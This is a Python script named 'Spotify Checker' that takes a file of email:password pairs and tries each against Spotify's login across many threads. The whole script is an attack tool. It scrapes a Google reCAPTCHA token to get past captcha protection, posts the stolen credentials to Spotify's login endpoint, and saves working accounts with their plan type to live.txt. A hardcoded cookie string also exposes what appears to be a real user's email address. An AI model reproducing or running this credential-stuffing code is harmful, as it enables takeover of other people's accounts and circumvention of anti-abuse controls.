from os import error
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore,init
import time
from multiprocessing.dummy import Pool as ThreadPool
from bs4 import BeautifulSoup
import json

saveBad = 'n'
saveLive = 'y'
printLive = 'y'
printBad = 'y'
printErrors = 'y'
proses = 0
def main():
    global saveBad
    global saveLive
    global printBad
    global printLive
    global printErrors
    init(convert=True)
    if saveLive == 'y' or saveLive == 'n' and saveBad == 'y' or saveBad == 'n' and printLive == 'y' or printLive == 'n' and printBad == 'y' or printBad == 'n' and printErrors == 'y' or printErrors == 'n':
        print("""
                            #==============================#
                            #        Spotify Checker       #
                            #           FrostFex           #
                            #==============================#
        """)
        threadamt = int(input("Thread: "))
        filename = input("File: ")
        file = open(filename, encoding="utf-8")
        lines = file.readlines()
        pool = ThreadPool(threadamt)
        oof = pool.map(checker, lines)
    else:
        print("Invalid settings.")
        time.sleep(2)
        main()


def checker(line):
    global proses
    try:
        line = line.strip('\n')
        line2 = line.split(":")
        email = line2[0]
        password = line2[1]
        headers = {
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding':'gzip, deflate, br',
    'Accept-Language':'en-US,en;q=0.9,fa;q=0.8',
    'Pra':'no-cache',
    'set-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin'
    }
        r = requests.get('https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&v=iSHzt4kCrNgSxGUYDFqaZAL9&size=invisible&cb=q7o50gyglw4p', headers=headers, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser') 
        token = (soup.find('input')['value'])
        headers = {
                'accept':'*/*',
                'accept-encoding':'gzip, deflate, br',
                'accept-language':'en-US,en;q=0.9,fa;q=0.8',
                'Pragma': 'no-cache',
                'origin': 'https://www.google.com',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36'
        }

        r = requests.post(f'https://www.google.com/recaptcha/api2/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&v=iSHzt4kCrNgSxGUYDFqaZAL9&reason=q&c={token}', headers=headers)
        rresp = r.text.split('"')[3]
        nid = r.cookies['NID']
        headers2 ={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
            'Pragma': 'no-cache',
            'Accept': '*/*',
  #          'cookie': f'NID= {nid}'
        }

        r = requests.get('https://accounts.spotify.com/en/login', headers=headers2, timeout=5)
        csrf = r.cookies['csrf_token']
        devid = r.cookies['__Host-device_id']
        tpa = r.cookies['__Secure-TPASESSION']
        ledn = f"remember=true&continue=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&username={email}&password={password}&recaptchaToken={rresp}&csrf_token={csrf}"
        #ledn = str(ledn.count(''))

        headers = {
                'Content-type':'application/x-www-form-urlencoded',
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
        #        'content-length': ledn,
                'origin': 'https://accounts.spotify.com',
                'referer': 'https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&_locale=en-AE',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
        }
        cookielog = {
                'cookie': f'sp_t=576b5e3d-a565-47d4-94ce-0b6748fdc625; _gcl_au=1.1.1585241231.1587921490; sp_adid=fbe3a5fc-d8a3-4bc5-b079-3b1663ce0b49; _scid=5eee3e0e-f16b-4f4c-bf73-188861f9fb0c; _hjid=fb8648d2-549b-44c8-93e9-5bf00116b906; _fbp=fb.1.1587921496365.773542932; __Host-device_id={devid}; cookieNotice=true; sp_m=us; spot=%7B%22t%22%3A1596548261%2C%22m%22%3A%22us%22%2C%22p%22%3Anull%7D; sp_last_utm=%7B%22utm_campaign%22%3A%22alwayson_eu_uk_performancemarketing_core_brand%2Bcontextual-desktop%2Btext%2Bexact%2Buk-en%2Bgoogle%22%2C%22utm_medium%22%3A%22paidsearch%22%2C%22utm_source%22%3A%22uk-en_brand_contextual-desktop_text%22%7D; _gcl_dc=GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB; _gcl_aw=GCL.1596996484.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB; _gac_UA-5784146-31=1.1596996518.Cj0KCQjwvb75BRD1ARIsAP6LcqseeQ-2Lkix5DjAXxBo0E34KCiJWiUaLO3oZTeKYJaNRP0AKcttUN4aAlMyEALw_wcB; ki_t=1597938645946%3B1599140931855%3B1599140931855%3B3%3B3; ki_r=; optimizelyEndUserId=oeu1599636139883r0.3283057902318758; optimizelySegments=%7B%226174980032%22%3A%22search%22%2C%226176630028%22%3A%22none%22%2C%226179250069%22%3A%22false%22%2C%226161020302%22%3A%22gc%22%7D; optimizelyBuckets=%7B%7D; sp_landingref=https%3A%2F%2Fwww.google.com%2F; _gid=GA1.2.2046705606.1599636143; _sctr=1|1599634800000; sp_usid=ceb6c24c-d1b4-4895-bcb7-e4e386afd063; sp_ab=%7B%222019_04_premium_menu%22%3A%22control%22%7D; _pin_unauth=dWlkPVlUQXdaV0UyTXprdE1EQmxOaTAwWlRCbUxUbGtNVGN0T0RVeE1ERTVNalEwTnpBMSZycD1abUZzYzJV; __Secure-TPASESSION={tpa}; __bon=MHwwfC0yODU4Nzc4NjN8LTEyMDA2ODcwMjQ2fDF8MXwxfDE=; remember=Vasssilisa%40bk.ru; OptanonAlertBoxClosed=2020-09-09T18: 37:10.735Z; OptanonConsent=isIABGlobal=false&datestamp=Wed+Sep+09+2020+11%3A37%3A11+GMT-0700+(Pacific+Daylight+Time)&version=6.5.0&hosts=&consentId=89714584-b320-4c03-bd3c-be011bfaba6d&interactionCount=1&landingPath=NotLandingPage&groups=t00%3A1%2Cs00%3A1%2Cf00%3A1%2Cm00%3A1&AwaitingReconsent=false&geolocation=US%3BNJ; csrf_token={csrf}; _ga_S35RN5WNT2=GS1.1.1599675929.1.1.1599676676.0; _ga=GA1.2.1572440783.1597938634; _gat=1'
        }
        go = requests.Session()
        r = go.post('https://accounts.spotify.com/login/password',headers=headers ,data=ledn, cookies=cookielog, timeout=5)
        cap = go.get('https://www.spotify.com/us/api/account/overview/', headers=headers2, timeout=5)
        if r.status_code == 200:
                capdic = json.loads(cap.text)
                capdic = (capdic['props']['plan']['plan']['name'])
        try:
            if r.status_code == 200 and saveLive == 'y' and printLive == 'y':
                proses = proses + 1
                uwu = open('live.txt','a')
                uwu.write(line + '\n')
                print(Fore.BLUE,"ExEcute:", proses, Fore.GREEN + " [LIVE] " + line + " Plan:" + capdic)
            elif r.status_code == 200 and saveLive == 'n' and printLive == 'y':
                proses = proses + 1
                print(Fore.BLUE,f"ExEcute:{proses}",Fore.GREEN + "[LIVE] " + line + " Plan:" + capdic)
            elif r.status_code == 200 in r.text and saveLive == 'y' and printLive == 'n':
                proses = proses + 1
                uwu = open('live.txt','a')
                uwu.write(line + '\n')
            elif r.status_code == 400 and saveBad == 'y' and printBad == 'y':
                proses = proses + 1
                uwu = open('die.txt','a')
                uwu.write(line + '\n')
                print(Fore.BLUE,"ExEcute:", proses,Fore.RED + "[DIE] " + line)
            elif r.status_code == 400 and saveBad == 'y' and printBad == 'n':
                proses = proses + 1
                uwu = open('die.txt','a')
                uwu.write(line,'\n')
            elif r.status_code == 400 and saveBad == 'n' and printBad == 'y':
                proses = proses + 1
                print(Fore.BLUE,"ExEcute:", proses,Fore.RED + "[DIE] " + line)
            else:
                print(r.text)
        except:
            if printErrors == 'n':
                print(error)
    except:
        if printErrors == 'y':
            checker(line)
            print(error,line)


main()